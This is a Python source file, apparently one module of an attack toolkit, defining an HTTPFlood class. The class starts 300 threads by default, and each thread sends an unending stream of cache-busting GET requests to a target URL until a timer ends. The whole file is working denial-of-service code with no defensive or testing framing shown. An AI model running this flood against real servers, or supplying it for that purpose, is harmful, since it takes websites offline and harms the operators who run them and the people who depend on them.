import requests
import threading
import random
import logging
from .base import AttackBase

logger = logging.getLogger(__name__)

class HTTPFlood(AttackBase):
    def __init__(self, target, config):
        super().__init__(target, config)
        self.thread_count = config.get('threads', 300)
        self.url = target.base_url

    def run(self):
        logger.info("HTTP Flood: %d threads", self.thread_count)
        threads = []
        for _ in range(self.thread_count):
            t = threading.Thread(target=self._flood, daemon=True)
            t.start()
            threads.append(t)
        self._stop_event.wait(self.duration)
        logger.info("HTTP Flood finished")

    def _flood(self):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(pool_connections=1, pool_maxsize=1)
        session.mount('http://', adapter)
        while not self._stop_event.is_set():
            try:
                session.get(f"{self.url}/?{random.randint(0,999999)}", timeout=1)
            except:
                pass
